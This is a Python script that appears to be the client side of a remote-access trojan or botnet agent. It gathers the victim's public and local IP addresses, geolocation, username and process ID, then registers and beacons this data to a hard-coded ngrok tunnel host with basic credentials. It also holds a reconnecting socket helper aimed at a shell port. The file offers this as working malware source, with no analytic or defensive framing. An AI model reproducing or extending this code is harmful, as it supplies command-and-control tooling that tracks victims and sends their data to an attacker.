import base64
import os, time
import rsa
import hashlib
import socket, subprocess, requests
from requests import get
from requests.exceptions import ConnectionError

def waiting(s=None, creds=()):
    del s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(creds)
    except:
        s.close()
        s = waiting(s=s, creds=creds)
        return s
    else:
        return s

def show_geo(public_ip=None):
    try:
        geo = []
        lp = str(socket.gethostbyname(socket.gethostname()))
        geo.append(public_ip + " - public ip\n" + lp + " - local ip")

        ip = public_ip
        response = requests.get(url=f"http://ip-api.com/json/{ip}").json()
        if response["status"] == "fail":
            return "fail"
        for name in response:
            name = str(name)
            if "country" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "regionName" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "city" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lat" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lon" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "as" in name:
                geo.append("computer" + " -->> " + str(response[name]))
        """area = folium.Map(location=[response.get("lat"), response.get("lon")])
        area.save(f"{response.get('query')} {response.get('city')}.html")"""
        return "\n".join(geo)
    except requests.exceptions.ConnectionError:
        print("Connection died")
        return


ip, port = ("acae-92-118-75-80.ngrok-free.app", 3333)
shell_addr = ("", 8081)

# os.system('chcp 65001')
subprocess.getoutput('chcp 65001')

alias = str(rsa.PrivateKey.load_pkcs1(os.urandom(16)))[::]

key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), 100000)

client_ip = get("http://api.ipify.org").text
data = {"port": port,
        "alias": alias,
        "status": "register",
        "user": subprocess.getoutput('whoami'),
        'pid': str(os.getpid()),
        'ip': client_ip,
        "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1],
        "encr_key": str(key),
        }

# headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
headers = {'Connection':'close'}

url = 'https://' + ip + '/'
# c_len = len(data.get('user')) + len(data.get('pid')) + len(data.get('pwd')) + 10
creds = ('user', 'pass')

while True:
    if (requests.post(url, data=data, auth=creds, headers=headers)).status_code == 200:
        break
    print("fail")

time.sleep(1)
print('ok')

while True:
    try:
        time.sleep(60)
        client_ip = get("http://api.ipify.org").text
        data = {"port": port, "alias": alias, "status": "update", "user": subprocess.getoutput('whoami'),
                'pid': str(os.getpid()), 'ip': client_ip,
                "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1]}
        headers = {'Connection': 'close'}

        url = 'https://' + ip + '/'
        creds = ('user', 'pass')

        print("send")
    except requests.exceptions.ConnectionError:
        pass

# os.Popen("python client.py")